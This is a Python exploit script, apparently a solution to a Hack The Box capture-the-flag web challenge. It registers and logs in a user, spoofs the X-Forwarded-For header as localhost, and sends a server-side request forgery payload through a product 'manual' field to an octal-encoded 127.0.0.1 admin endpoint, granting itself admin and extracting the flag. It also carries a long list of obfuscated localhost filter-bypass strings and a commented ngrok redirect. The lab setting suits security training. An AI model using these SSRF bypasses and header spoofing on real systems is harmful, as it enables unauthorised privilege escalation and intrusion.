#!/usr/bin/python3

from re import findall

import requests

url = "http://94.237.53.58:39337/"

# headers = {
#     "cookie": "session=.eJwVy90OgiAAQOF34QFcOGuju4ZTIMXNlKmXok3Ev5KLsPXu6fU53xeYWbcTuILWsq4OpUoUo_lGIVd0pVN6lpheqF4KgRly9glKV9h6DEz12MO4dBXJVYSZrd3PQPtZNQUf5IFH4R04zspz4sce73PIyckRoX2TwMfUmADdYFRk2ywQ4fqJ7Nq8VOmmLNVa53cJfn_P9TVU.ZTr-Gg.kiVGej7ymFBai_NfiIJ_slr0nbM", 
#     "X-Forwarded-For": "127.0.0.1"
# }

#bypass = ["https://be28-31-94-31-94.ngrok-free.app/redirect.php",]

bypass = ["①②⑦.⓪.⓪.⓪", "127.1", "0", "127.0.1", "[::]", "0000::1", "[::1]", "0:0:0:0:0:0:0:0", "http://127。0。0。1",  "http://127｡0｡0｡1",  "http://127．0．0．1",  "http://⑫７｡⓪．𝟢。𝟷",  "http://𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹",  "http://⁰𝔁𝟳𝙛𝟢０１",  "http://２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑",  "http://𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟",  "http://𝟢₁𝟳₇｡０｡０｡𝟢𝟷",  "http://𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣",  "http://[::𝟏②₇．𝟘．₀．𝟷]",  "http://[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]",  "http://[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]",  "http://[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]",  "http://𝟎𝚇𝟕𝖋｡⓪｡𝟣",  "http://𝟎ˣ𝟩𝘍｡𝟷",  "http://𝟘𝟘①𝟕⑦．１",  "http://⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏",  "http://017700000001"]

# for _url in bypass:

# 	data = {
# 	    "name": "haha",
# 	    "price": "hahha",
# 	    "description": "hahha",
# 	    "manual": f"{_url}:1337/api/addAdmin?username=jadu",
# 	}

# 	r = requests.post(url + "api/product", headers=headers, json=data)

# 	if r.status_code != 400:
# 		print(_url)

# 	print(r.status_code)

creds = {"username": "jadu", "password": "jadu"}

register = requests.post(url + "/api/register", json=creds)

assert register.status_code == 200

print("[*]Registered!!")

login = requests.post(url + "/api/login", json=creds)

assert login.status_code == 200

print("[*]Logged In!!")

cookie = login.headers.get("Set-Cookie")

#print(login.headers)

headers = {
    "cookie": f"{cookie}", 
    "X-Forwarded-For": "127.0.0.1"
}
# print(headers)
# exit(1)

data = {
	    "name": "haha",
	    "price": "hahha",
	    "description": "hahha",
	    "manual": "http://017700000001:1337/api/addAdmin?username=jadu",
}

r = requests.post(url + "api/product", headers=headers, json=data)

assert r.status_code == 200

print(r.text)


login = requests.post(url + "/api/login", json=creds)

assert login.status_code == 200

print("[*]Logged In Again to refersh the cookie!!")

new_cookie = login.headers.get("Set-Cookie")

print(login.headers)

headers = {
    "cookie": f"{new_cookie}", 
    "X-Forwarded-For": "127.0.0.1"
}

login_home = requests.get(url + "/home", headers=headers, json=creds)


flag = findall("HTB{.*}", login_home.text)[-1]

print(flag)